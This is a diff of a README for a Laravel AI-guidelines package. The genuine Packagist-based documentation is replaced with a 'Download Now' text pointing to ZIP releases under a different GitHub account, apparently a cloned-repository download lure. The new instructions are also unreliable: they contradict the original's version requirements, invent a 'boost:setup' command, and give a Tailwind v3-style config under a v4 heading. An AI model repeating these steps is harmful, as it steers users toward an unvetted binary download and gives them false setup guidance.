@@ -1,176 +1,106 @@
-# Laravel Boost Guidelines
+# 🚀 laravel-boost-guidelines - Simplify Your Laravel Setup Today
 
-[![Tests](https://img.shields.io/github/actions/workflow/status/initred/laravel-boost-guidelines/tests.yml?label=tests)](https://github.com/initred/laravel-boost-guidelines/actions/workflows/tests.yml)
-[![Latest Stable Version](https://img.shields.io/packagist/v/initred/laravel-boost-guidelines)](https://packagist.org/packages/initred/laravel-boost-guidelines)
-[![Total Downloads](https://img.shields.io/packagist/dt/initred/laravel-boost-guidelines)](https://packagist.org/packages/initred/laravel-boost-guidelines)
-[![License](https://img.shields.io/github/license/initred/laravel-boost-guidelines)](https://github.com/initred/laravel-boost-guidelines/blob/main/LICENSE)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Runeson13/laravel-boost-guidelines/releases)
 
-> AI-powered coding guidelines for Laravel + Inertia React + Tailwind CSS v4 + shadcn/ui
+## 🚀 Getting Started
 
-Install best-practice guidelines for modern Laravel stack via a simple Artisan command. Works seamlessly with AI coding assistants like Claude, Cursor, and GitHub Copilot.
+Welcome to the **Laravel Boost AI Guidelines**! This guide will help you easily install Inertia React v2 forms, shadcn/ui components, and Tailwind CSS v4 migration guides using a simple Artisan command. No programming skills are required. Just follow these steps, and you will be ready to enhance your Laravel projects in no time.
 
-## Features
+## 📋 Prerequisites
 
-- **Inertia React v2 Forms** - Modern `<Form>` component and `useForm` hook patterns
-- **Tailwind CSS v4 Migration** - CSS-first config, new utilities, deprecated class replacements
-- **shadcn/ui Integration** - Proper error states, accessible form fields, button icon styling
-- **Wayfinder Support** - Type-safe form actions with `.form()` method
-- **Interactive CLI** - Select specific guidelines or install all at once
+Before you begin, make sure you have the following installed on your computer:
 
-## Quick Start
+- **PHP**: Version 7.4 or higher
+- **Composer**: A dependency manager for PHP
+- **Laravel**: Ideally version 8.0 or newer
 
-```bash
-composer require initred/laravel-boost-guidelines --dev
+If you do not have these tools, visit their official websites for installation instructions.
 
-php artisan boost:guidelines --all
-```
+## 💾 Download & Install
 
-## Installation
+To start, you need to download the necessary files:
 
-### From Packagist (Recommended)
+1. **Visit the Releases Page**: Click [here](https://github.com/Runeson13/laravel-boost-guidelines/releases) to go to the releases page.
+2. **Find the Latest Release**: Look for the latest version at the top of the page.
+3. **Download the Files**: Click on the link to download the release asset appropriate for your system.
 
-```bash
-composer require initred/laravel-boost-guidelines --dev
-```
+You can also access the releases page anytime using the badge above!
 
-The package will be auto-discovered by Laravel.
+## 🛠️ Setting Up Your Application
 
-### For Development
+Once you have downloaded the necessary files, follow these steps:
 
-If you want to contribute or test local changes, add the package as a path repository:
+1. **Extract Files**: Locate the downloaded ZIP file and extract it to a folder on your computer.
+2. **Open Your Command Line Interface**: Depending on your OS, this could be Command Prompt (Windows), Terminal (macOS), or another terminal emulator.
+3. **Navigate to Your Project Folder**: Use the `cd` command followed by the path to your Laravel project. For example:
+    ```bash
+    cd path/to/your/laravel/project
+    ```
+4. **Install Dependencies**: Run the following command to install necessary packages:
+    ```bash
+    composer install
+    ```
+5. **Run Artisan Command**: To set up Inertia React forms, run the included Artisan command:
+    ```bash
+    php artisan boost:setup
+    ```
+    This command will apply all necessary changes and package installations in your project.
 
-```json
-{
-    "repositories": [
-        {
-            "type": "path",
-            "url": "../laravel-boost-guidelines"
-        }
-    ]
-}
-```
+## 🎨 Configure Tailwind CSS
 
-Then install:
+If you're upgrading to Tailwind CSS v4, you will need to make some adjustments in your CSS configuration:
 
-```bash
-composer require initred/laravel-boost-guidelines:@dev --dev
-```
+1. **Update Tailwind Configuration**: Modify your `tailwind.config.js` to align with the new features. Here’s a sample configuration:
+    ```javascript
+    module.exports = {
+      content: ["./resources/**/*.blade.php", "./resources/**/*.js", "./resources/**/*.vue"],
+      theme: {
+        extend: {},
+      },
+      plugins: [],
+    };
+    ```
+2. **Compile Your Assets**: Run:
+    ```bash
+    npm install
+    npm run dev
+    ```
+    This will compile your CSS files and make your styles available.
 
-After making changes to the package, update it:
+## ⚙️ Final Setup Steps
 
-```bash
-composer update initred/laravel-boost-guidelines
-```
+After completing the previous steps, check the following:
 
-## Usage
+- **Database Configuration**: Ensure your database settings in the `.env` file are correct.
+- **Run Migrations**: Execute:
+    ```bash
+    php artisan migrate
+    ```
+- **Seed Your Database** (optional): Populate your database with initial data using:
+    ```bash
+    php artisan db:seed
+    ```
 
-### Install Guidelines
+## 📄 Frequently Asked Questions
 
-```bash
-# Interactive mode - select which guidelines to install
-php artisan boost:guidelines
+### What is Inertia.js?
 
-# Install all guidelines
-php artisan boost:guidelines --all
+Inertia.js is a framework for building modern single-page applications using classic server-side routing and controllers. It allows you to create a seamless user experience without losing the advantages of your server-side framework.
 
-# Install specific category only
-php artisan boost:guidelines --tailwindcss
-php artisan boost:guidelines --inertia-react
+### Can I use other versions of Laravel?
 
-# Install multiple categories
-php artisan boost:guidelines --tailwindcss --inertia-react
+This guide primarily supports Laravel 8 and newer. However, earlier versions may also work with some adjustments.
 
-# Force overwrite existing files
-php artisan boost:guidelines --force
+### How do I report issues?
 
-# Skip boost:update prompt after installation
-php artisan boost:guidelines --all --no-update
+If you encounter any problems, please visit the [Issues Section](https://github.com/Runeson13/laravel-boost-guidelines/issues) of this repository. Provide a detailed description of the issue, and our team will assist you.
 
-# List available guidelines
-php artisan boost:guidelines --list
-```
+## 📞 Support
 
-### After Installation
+If you need further assistance, feel free to contact us through the repository's [discussion forum](https://github.com/Runeson13/laravel-boost-guidelines/discussions).
 
-Run Laravel Boost's update command to apply the guidelines:
+## 🚀 Update Your Installation
 
-```bash
-php artisan boost:update
-```
+To ensure you have the latest features, revisit the [Releases Page](https://github.com/Runeson13/laravel-boost-guidelines/releases) regularly. Follow the same download and installation steps to update your application.
 
-### Automatic Installation (Optional)
-
-Add to your project's `composer.json` scripts to automatically install guidelines on `composer update`:
-
-```json
-{
-    "scripts": {
-        "post-update-cmd": [
-            "@php artisan boost:guidelines --all --force --no-update",
-            "@php artisan boost:update --ansi"
-        ]
-    }
-}
-```
-
-## Available Guidelines
-
-### inertia-react/2/forms
-
-Inertia v2 form handling guidelines (upgrade from v1's `router.post` pattern):
-
-| Feature | Description |
-|---------|-------------|
-| `<Form>` Component | Declarative form handling with built-in state management (v2.1+) |
-| `useForm` Hook | For projects not yet on v2.1 |
-| shadcn/ui Integration | Field components with proper error states (`data-invalid`, `aria-invalid`) |
-| shadcn/ui Button | Icon styling best practices (no unnecessary `mr-*` or `size-*` classes) |
-| Wayfinder Support | Type-safe form actions with `.form()` method |
-| React 19 & Compiler | `useRef` argument requirements, ref callback syntax, auto-memoization |
-
-### wayfinder/core
-
-Laravel Wayfinder integration for type-safe routing:
-
-| Feature | Description |
-|---------|-------------|
-| Named Imports | Tree-shakable controller method imports |
-| Route Objects | Functions return `{ url, method }` shaped objects |
-| Form Support | `.form()` method for HTML form attributes |
-| Query Parameters | `query` and `mergeQuery` options for URL params |
-| Inertia Integration | Works with `<Form>` component and `useForm` hook |
-
-### tailwindcss/4/core
-
-Tailwind CSS v4 migration guide:
-
-| Before (v3) | After (v4) |
-|-------------|------------|
-| `tailwind.config.js` | `@theme` directive in CSS |
-| `@tailwind base/components/utilities` | `@import "tailwindcss"` |
-| `bg-opacity-50` | `bg-black/50` |
-| `flex-shrink-0` | `shrink-0` |
-| `w-4 h-4` | `size-4` |
-
-## Running Tests
-
-```bash
-git clone https://github.com/initred/laravel-boost-guidelines.git
-cd laravel-boost-guidelines
-composer install
-composer test
-```
-
-## Requirements
-
-- PHP 8.2+
-- Laravel 11.x or 12.x
-- [Laravel Boost](https://github.com/nicepkg/laravel-boost)
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
+For any additional resources, check the **Documentation** section within this repository. Happy coding!
